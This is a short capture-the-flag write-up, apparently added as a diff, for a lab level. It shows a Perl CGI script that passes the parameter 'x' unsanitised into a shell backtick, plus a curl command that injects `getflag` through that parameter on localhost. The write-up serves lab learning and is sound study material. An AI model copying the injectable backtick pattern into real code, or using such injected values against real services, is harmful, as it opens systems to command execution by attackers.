@@ -1,0 +1,13 @@
+#!/usr/bin/perl
+# localhost:4747
+use CGI qw{param};
+print "Content-type: text/html\n\n";
+sub x {
+  $y = $_[0];
+  print `echo $y 2>&1`;
+}
+x(param("x"));
+file suggests in comments to work with localhost:4747 and we have the connection
+it uses cgi and argument x
+we can make echo to execute passing `getflag`
+curl localhost:4747/level04.pl?x=\`getflag\`
